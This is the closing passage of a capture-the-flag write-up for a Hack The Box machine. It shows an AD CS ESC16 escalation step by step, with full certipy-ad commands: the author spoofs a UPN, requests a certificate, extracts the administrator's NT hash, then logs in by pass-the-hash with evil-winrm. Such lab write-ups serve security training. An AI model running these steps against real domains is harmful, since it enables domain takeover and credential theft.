    ESC9: Individual templates lack the security extension requirement
    ESC16: The CA itself is configured to never include the security extension, affecting ALL certificates regardless of template

Vulnerability Conditions

    CA EditFlags modified to remove require_sidisupport
    Global security extension removal affecting all issued certificates
    Any template with client authentication EKU becomes exploitable


To exploit this, we first need to update the UPN (User Principal Name) of the ca_svc user to administrator 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad account update -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -user 'ca_svc' -upn administrator -dc-ip 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Perfect . Next we have to request to obtain certificate and private key -> 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad req -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Then we can get our NTLM hash of administrator 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -domain fluffy.htb                                                               
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: administrator
[-] See the wiki for more information
```

But I forgot to change ca_svc user UPN to normal , lets do it first-> 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad account update -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -user 'ca_svc' -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -domain fluffy.htb                                                                                  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
343d974bdae1da36110bdef7890fd21c
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And Here we go. It was a bit hard but so interesting to work with certificates.

Thanks for attention.!


